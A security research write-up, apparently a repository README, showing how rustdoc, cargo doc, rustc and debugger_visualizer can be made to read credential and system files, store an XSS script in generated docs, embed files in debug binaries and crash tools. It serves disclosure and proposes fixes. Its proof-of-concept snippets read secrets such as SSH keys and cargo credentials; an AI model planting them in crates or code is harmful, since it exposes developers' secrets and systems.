# Rust security ~~problems~~ acceptance

TL/DR: 
- generating docs with `rustdoc`/`cargo doc` provides arbitrary file access, stored XSS, data extraction, execution of random macros and out-of-memory crashes
- `rustc`/`rustfmt` can crash your IDE and in some cases systemd
- `#![debugger_visualizer]` allows storing of arbitrary files in debug binaries (+ special python scripts for `rust-gdb` users)
- third-party module dependencies somewhere deep down can trigger this
- rust security model works very well until a piece of malware slips through `crates.io` security scanning but this won't happen

---

If you're a developer using rust and the cargo repository at [crates.io](https://crates.io/), you're implicitly accepting several security risks. 
Generally, the risk of [supply chain attacks](https://en.wikipedia.org/wiki/Supply_chain_attack) with rust is not much different than using untrusted Node.js packages from NPM or python libraries from PyPi.

However, rust goes a bit further and has several **compile-time / formatting-time / parsing-time language "features"** which create security risks for unsuspecting developers such as code execution, exposure of sensitive data (SSH private keys at `~/.ssh/id_{rsa,ed25519}` or cargo login credentials at `~/.cargo/credentials.toml`) and much more.

The rust project has made a conscious decision to accept these risks:

> The threat model of the Rust compiler assumes that the source code of the project and all the dependencies being built is fully trusted

This is a valid academic argument, which conveniently limits the scope of security problems. On a daily basis, developers using rust extend a lot of trust into source code from cargo modules, github, google, or AI. And even though cargo modules on crates.io seem to be scanned for malware, things could go wrong.

It's very likely that the rust community will experience some sort of supply chain attack in the future. As a novice rust developer, I wanted to see what kind of security controls are in place already. This repository documents these efforts and aims to raise awareness in favor of implementing additional security controls for `rustdoc` and `rustfmt`, and more guardrails around macros in `rustc` in general.

Overview / Table of contents:

- Expectation: Running `rustdoc` / `cargo doc` is safe
  - Reality: `rustdoc` exposes arbitrary files and provides persistent XSS
  - Reality: `cargo doc` exposes arbitrary files and provides persistent XSS
  - Reality: both `rustdoc` and `cargo doc` execute macros
  - Reality: `rustdoc` fills up all memory
- Expectation: No security risk when compiling with `rustc`
  - Reality: `rustc` exposes arbitrary files
  - Reality: `rustc` crashes everything (systemd)
  - Reality: `rustc` crashes my IDE
  - Reality: `rustc` crashes with SIGSEGV
- Expectation: No security risk when formatting with `rustfmt`
  - Reality: `rustfmt` crashes with SIGSEGV
- Expectation: Rust binary will not contain arbitrary files
  - Reality: Rust debug binaries can contain arbitrary files
- Expection: `rust-gdb` users can't be backdoored via `#![debugger_visualizer]`
  - Reality: Python scripts embedded via `#![debugger_visualizer]` can be executed by `rust-gdb`

# Expectation: Running `rustdoc` / `cargo doc` is safe

Here we'll be running `rustdoc` on untrusted files and `cargo doc` using third-party dependencies. 
Only the rust documentation syntax is needed because we won't be compiling any untrusted code or even running it...

## Reality: `rustdoc` exposes arbitrary files and provides persistent XSS

Put example code into `main.rs` and run `rustdoc main.rs`. Please note that there's no main function or anything - it is pure documentation syntax, not rust code.

```rust
///  <script>let val = `
#[doc = include_str!("/etc/passwd")]
#[doc = include_str!("/proc/self/environ")]
#[doc = include_str!(concat!(env!("HOME"), "/.cargo/credentials.toml"))]
#[doc = include_str!(concat!(env!("HOME"), "/.ssh/id_rsa.pub"))]
/// `; alert(val);</script>
pub trait foo {}
```

Open the HTML files in the newly-created `doc/` folder with a web browser. There will be a Javascript popup containing all your secret data. Both the reading of arbitrary files with [#[doc = include_str!()]](https://doc.rust-lang.org/rustdoc/write-documentation/the-doc-attribute.html#the-doc-attribute) and the [stored Cross-Site Scripting](https://github.com/rust-lang/docs.rs/issues/167) are official features of `rustdoc`.  Now that your secrets are stored a Javascript variable, a malicious attacker can easily exfiltrate them over the web. The exfiltration will happen once someone views the HTML document. The stored Javascript payload will provide a persistent way to exploit browser-based clients.

Fun fact: Apparently a security-conscious member of the rust project [implemented a security control to prevent macros from reading arbitrary environment variables](https://github.com/rust-lang/rust/blob/490b2cc09860dd62a7595bb07364d71c12ce4e60/compiler/rustc_builtin_macros/src/env.rs#L175C4-L175C20), but this security control is useless as `rustdoc` can directly read the `/prov/self/environ` file.

## Reality: `cargo doc` exposes arbitrary files and provides persistent XSS

The security risks of `rustdoc` are amplified when using `cargo doc` in a rust project with third-party modules (e.g. from crates.io). 
By default, `cargo doc` will run `rustdoc` on each third-party module, which can trigger the inclusion of arbitrary files in the output.

For reproduction create a rust project with `cargo init myapp` and add a dependency called `evildependency` which has the following code in `src/lib.rs`.

```
///  <script>let val = `
#[doc = include_str!("/etc/passwd")]
#[doc = include_str!("/proc/self/environ")]
/// `; document.write(val);</script>
pub trait foo {}
```

When running `cargo doc` from the `myapp` project folder it will create HTML documentation for our project. 
The documentation will contain a section about `evildependency`. Once a web browser openes this HTML page, the Javascript code will be executed and the previously stored contents of `/etc/passwd` and `/proc/self/environ` will be visible.

## Reality: both `rustdoc` and `cargo doc` execute macros

Put example code into `main.rs` and run `rustdoc main.rs`. There is no documentation syntax used, the `private_no_docs()` function is unreachable code, it will never be called by `main()`. 

```rust
fn private_no_docs() { 
  let nobody_ever_uses_this = include_str!("/etc/passwd-FILE_DOES_NOT_EXIST");
}

fn main() {}
```

Both `rustdoc` and `cargo doc` will execute the `include_str!()` macro even though it is in an ***unreachable*** part of the code. They'll try to open the non-existing file `/etc/passwd-FILE_DOES_NOT_EXIST` and throw a big error. `cargo doc` will happily execute this code even if it is hidden somewhere in a dependency.

```
 $ cargo doc
 Documenting evildependency v0.1.0 (./cargo-rustdoc/evildependency)
    Checking evildependency v0.1.0 (./cargo-rustdoc/evildependency)
error: couldn't read `/etc/passwd-FILE_DOES_NOT_EXIST`: No such file or directory (os error 2)
 --> ./cargo-rustdoc/evildependency/src/lib.rs:8:31
  |
8 |   let nobody_ever_uses_this = include_str!("/etc/passwd-FILE_DOES_NOT_EXIST");
  |                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |
  = note: this error originates in the macro `include_str` (in Nightly builds, run with -Z macro-backtrace for more info)

error: could not document `evildependency`
warning: build failed, waiting for other jobs to finish...
error: could not compile `evildependency` (lib) due to 1 previous error
```

This is unexpected for a software with the task of parsing documentation strings.



## Reality: `rustdoc` fills up all memory

The examples in `rustdoc_out_of_memory_{1,2}.rs` document how an infinite-size file such as `/dev/urandom` can be used for a Denial of Service (DOS) attack, with `rustdoc` taking up all system memory before the kernel will force-evict and crash the process. 

```rust
#[doc = include_str!("/dev/urandom")]
pub trait foo {}
```

Once the rust project implements restrictions around `include_str!()` then you can just use `debugger_visualizer()`.

```rust
#![debugger_visualizer(gdb_script_file = "/dev/zero")]
```

Bonus: This `rustdoc` feature can be tweaked to fill up all available space on the hard disk by including large-but-not-infinite-sized files into the documentation, which will then be copied to `doc/` folder and fill up the hard disk.



# Expectation: No security risk when compiling with `rustc`

As with many programming languages, all security goes out of the window once you compile untrusted code.
But the following issues are not a gravity-like physical phenomenon, they're a design choice by the rust project.

## Reality: `rustc` exposes arbitrary files 

Put example code into `main.rs` and run `rustc main.rs`. 

```rust
compile_error!(include_str!("/etc/passwd"));

fn main () {
  println!("this code is never run");
}
```

The compilation will abort and show an error message, but arbitrary files have already been accessed. If an attacker goes as far as creating their own build script with macros, they can immediately exfiltrate the stolen information from your system. If the attacker doesn't want to create network traffic at compile time, they can exfiltrate your secrets by simply including them in the compiled binary.

```
$ rustc rustc_access_files.rs 
error: root:x:0:0::/root:/bin/bash
       bin:x:1:1::/:/usr/bin/nologin
       daemon:x:2:2::/:/usr/bin/nologin
       mail:x:8:12::/var/spool/mail:/usr/bin/nologin
       ftp:x:14:11::/srv/ftp:/usr/bin/nologin
       [...]
       alpm:x:943:943:Arch Linux Package Management:/:/usr/bin/nologin
 --> rustc_access_files.rs:1:1
  |
1 | compile_error!(include_str!("/etc/passwd"));
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

error: aborting due to 1 previous error
```


## Reality: `rustc` crashes everything (systemd)

Put the example code into `main.rs` and run `rustc main.rs`. This [systemd crash](https://github.com/rust-lang/rust-enhanced/issues/536) can be experienced at least on linux 6.12 with sublime IDE using the official `rust-enhanced` plugin. While crashing all your applications through the simple act of compiling some rust code is interesting, the security impact is quite low.

```rust
compile_error!(include!("/dev/zero"));
```


## Reality: `rustc` crashes my IDE

Put the example code into `main.rs` and run `rustc main.rs`. Using [diagnostic attributes](https://doc.rust-lang.org/beta/reference/attributes/diagnostics.html) custom compilation errors can be created. The user's IDE can be drowned by a large number of such error messages, until it finally crashes. 

```rust
#[diagnostic::on_unimplemented(
  message = "ImportantTrait<{A{A}}> \x00` implemented for `{Self}`",
  label = "My Label\x00 ",
  note="9999",
  note= "oh",
  note= "I can add",
  note= "one million notes",
  // repeat note="" attribute 10.000 times with different content
  note= "and rustc will not complain",
)]
trait ImportantTrait<A> {}

fn use_my_trait(_: impl ImportantTrait<i32>) {}

fn main() {
  use_my_trait(String::new());
}
```
It's likely that a vulnerability in the IDE can be triggered with this, as it will be trying to parse thousands of log messages. Due to [lack of IDE bug bounties](https://www.reddit.com/r/netsec/comments/13wpvyh/i_found_a_remote_code_execution_bug_in_vscode/) this will not be investigated further.

Use Javascript `var ret = "";for (var i=0;i <10000; i++) { ret = ret + "note= \"a" + i +"\"," }; ret;` to create a proof of concept with several thousand of `note=` attributes which will the IDE from which `rustc` is called.


## Reality: `rustc` crashes with SIGSEGV

These two examples will crash the `rustc` compiler. Bugs have been filed [here](https://github.com/rust-lang/rust/issues/133773) and [here](https://github.com/rust-lang/rust/issues/133772). 

```rust
fn main () { let x = 1+1+1+1+/* ... repeat 10.000 times ... */+1; }
```
```rust
compile_error!(concat!(concat!(concat!(/* ... repeat 10.000 times ... */))));
```

```
error: rustc interrupted by SIGSEGV, printing backtrace
note: rustc unexpectedly overflowed its stack! this is a bug
note: maximum backtrace depth reached, frames may have been lost
note: we would appreciate a report at https://github.com/rust-lang/rust
help: you can increase rustc's stack size by setting RUST_MIN_STACK=16777216
note: backtrace dumped due to SIGSEGV! resuming signal
Segmentation fault (core dumped)
```

The rust team confirmed that these SIGSEGV crashes in `rustc` [cannot be exploited](https://github.com/rust-lang/rust/issues/133772#issuecomment-2515983738). However, given the aura of robustness and safety surrounding rust it's unexpected to find such unhandled exceptions.


# Expectation: No security risk when formatting with `rustfmt`

## Reality: `rustfmt` crashes with SIGSEGV

The files `rustfmt_crash_1.rs` and `rustfmt_crash_2.rs` will crash `rustfmt` with SIGSEGV.

```
$ rustfmt rustfmt_crash_2.rs 
thread 'main' has overflowed its stack
fatal runtime error: stack overflow
Aborted (core dumped)
```

Both `rustfmt` and `rustc` use the same functions to process source code, so they'll be equally affected by any bugs in the underlying rust libraries. The rust team confirms that these SIGSEGV crashes are not exploitable.


# Expectation: Rust binary will not contain arbitrary files

## Reality: Rust debug binaries can contain arbitrary files

In a previous example `#![debugger_visualizer]` was used to crash `rustdoc`. It's original use case is to embed python scripts into rust binaries for debugging purposes.
When running `cargo build` in a project with default settings or `rustc -g` on the command line, the following code in `evildependency/src/lib.rs` will embed arbitrary files from your computer in the newly-created binary.

```
#![debugger_visualizer(gdb_script_file = "/etc/passwd")]
#![debugger_visualizer(gdb_script_file = "/proc/self/environ")]
```

Even though the `#![debugger_visualizer]` macro is hidden deep in some third-party module, the rust binary compiled with debug settings will contain both files in the `debug_gdb_scripts` section.  
You can use `objdump -j .debug_gdb_scripts -s ${file}` to inspect your binary. 

```
$ objdump  target/debug/myapp -j .debug_gdb_scripts -s

target/debug/myapp:     file format elf64-x86-64

Contents of section .debug_gdb_scripts:
 4914b 01676462 5f6c6f61 645f7275 73745f70  .gdb_load_rust_p
 4915b 72657474 795f7072 696e7465 72732e70  retty_printers.p
 4916b 79000470 72657474 792d7072 696e7465  y..pretty-printe
 4917b 722d6d79 6170702d 300a726f 6f743a78  r-myapp-0.root:x
 4918b 3a303a30 3a3a2f72 6f6f743a 2f62696e  :0:0::/root:/bin
 4919b 2f626173 680a6269 6e3a783a 313a313a  /bash.bin:x:1:1:
 491ab 3a2f3a2f 7573722f 62696e2f 6e6f6c6f  :/:/usr/bin/nolo
 491bb 67696e0a 6461656d 6f6e3a78 3a323a32  gin.daemon:x:2:2
 491cb 3a3a2f3a 2f757372 2f62696e 2f6e6f6c  ::/:/usr/bin/nol
 491db 6f67696e 0a6d6169 6c3a783a 383a3132  ogin.mail:x:8:12
 491eb 3a3a2f76 61722f73 706f6f6c 2f6d6169  ::/var/spool/mai
 491fb 6c3a2f75 73722f62 696e2f6e 6f6c6f67  l:/usr/bin/nolog
 4920b 696e0a66 74703a78 3a31343a 31313a3a  in.ftp:x:14:11::
 4921b 2f737276 2f667470 3a2f7573 722f6269  /srv/ftp:/usr/bi
 4922b 6e2f6e6f 6c6f6769 6e0a6874 74703a78  n/nologin.http:x
 4923b 3a33333a 33333a3a 2f737276 2f687474  :33:33::/srv/htt
 4924b 703a2f75 73722f62 696e2f6e 6f6c6f67  p:/usr/bin/nolog
 4925b 696e0a6e 6f626f64 793a783a 36353533  in.nobody:x:6553
 [..]
```

Ooops, how did contents of `/etc/passwd` get into the binary? By definition this is not a security vulnerabiltiy, but maybe it'll be fixed when filed as a [bug report](https://github.com/rust-lang/rust/issues/133837).

# Expection: `rust-gdb` users can't be backdoored via `#![debugger_visualizer]`

## Reality: Python scripts embedded via `#![debugger_visualizer]` can be executed by `rust-gdb`

Experienced rust developers know that `#![debugger_visualizer(natvis_file = "python-script.py")` and `#![debugger_visualizer(gdb_script_file = "python-script.py")` will [embed python scripts in the debug build of your project](https://doc.rust-lang.org/reference/attributes/debugger.html). The original idea behind `#![debugger_visualizer]` mechanism is to allow custom python scripts for pretty-printing variables when using a debugger. Once the macro is called, rust will add a `.debug_gdb_scripts` section to the binary which by default links to the `gdb_load_rust_pretty_printers.py` python script. All other files referenced via `natvis_file` (on Windows) or `gdb_script_file` (on Linux) will be added after `gdb_load_rust_pretty_printers.py`.

```
$ rust-gdb -q target/debug/myapp
Reading symbols from target/debug/myapp...
warning: File "./myapp/target/debug/myapp" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load:/usr/lib/rustlib/etc".
To enable execution of this file add
  add-auto-load-safe-path ./myapp/target/debug/myapp
line to your configuration file "/home/user/.config/gdb/gdbinit".
To completely disable this security protection add
  set auto-load safe-path /
line to your configuration file "/home/user/.config/gdb/gdbinit".
For more information about this security protection see the
"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
  info "(gdb)Auto-loading safe path"
(gdb) info auto-load python-scripts .*
Loaded  Script                                                                 
Yes     gdb_load_rust_pretty_printers.py                                       
  full name: /usr/lib/rustlib/etc/gdb_load_rust_pretty_printers.py
No      pretty-printer-myapp-0                                                 
(gdb) 
```

When using `rust-gdb` on the debug build of our project, the `gdb_load_rust_pretty_printers.py` script is executed.
However, the custom python scripts which were embedded via `#![debugger_visualizer(gdb_script_file = "python-script.py")` won't be executed, because `gdb` has implemented additional security controls by allow-listing directories from which scripts can be loaded. Thankfully, with this choice the `gdb` project has reduced security risk for many rust users.

Unfortunately, the [official rust documentation wants you to enable auto-loading python scripts](https://doc.rust-lang.org/reference/attributes/debugger.html#using-debugger_visualizer-with-gdb) when using `rust-gdb`: 

> GDB supports the use of a structured Python script, called a pretty printer, that describes how a type should be visualized in the debugger view.
> Embedded pretty printers **are not automatically loaded when debugging a binary** under GDB. There are two ways to **enable auto-loading embedded pretty printers**:
> 1) Launch GDB with extra arguments to explicitly add a directory or binary to the auto-load safe path:
> 2) Create a file named gdbinit under $HOME/.config/gdb (you may need to create the directory if it doesn’t already exist). Add the following line to that file: add-auto-load-safe-path path/to/binary.

This auto-loading of scripts within gdb can provide additional persistence for attackers. It's enough for one third-party module installed via `cargo add` to have a single line of `#![debugger_visualizer(gdb_script_file = "my-python-backdoor.py")` and every time `rust-gdb` is used within the rust project it will be executed. The only security control preventing this right now is a simple `gdb` allow-list option.

# Next steps

No matter how security boundaries are defined, there is a problem.

## Expectations as a developer using rust

Here are some expectations for rust, which are hopefully not too far-fetched:

- As a developer using rust, I don't expect that `rustdoc` or `cargo doc` can steal arbitrary files.
- As a developer using rust, I don't expect that `rustdoc` or `cargo doc` can execute arbitrary code.
- As a developer using rust, I don't expect that `rustfmt` can crash my IDE or even whole system (systemd).
- As a developer using rust, I don't expect that third-party modules can access arbitrary files in my home directory.
- As a developer using rust, I don't expect that debug binaries contain arbitrary files from my computer.
- As `gdb`, I don't expect that `.gdb_script_file` contains non-python scripts.

In my opinion, these are not unrealistic expectations for a programming language ecosystem with more than 160'000 modules.

## TODO: Security Controls

Action items from the back of my head:

- [ ] Deny arbitrary file access by `include!()`, `include_str!()` and `include_bytes!()`.
- [ ] Deny arbitrary file access by `#[doc=include_str!()]`
- [ ] Prevent `rustdoc` from running macros
- [ ] Prevent `rustdoc` from creating persistent XSS in the documentation HTML files
- [ ] Disable `[debugger_visualizer]` for all dependencies, let power users enable it on a case-by-case basis.
- [ ] Prevent third-party modules from reading files in home folder
- [ ] Deny access to infinite-size files such as `/dev/zero` and `/dev/urandom` to stop out-of-memory errors
- [ ] Prevent `#[diagnostic::on_unimplemented]` (or `#[..]` in general) from having infinite amount of items
- [ ] Audit `crates.io` for any behavior described in this document

# More quirks...

If you know any other interesting quirks please feel free to contribute to this repo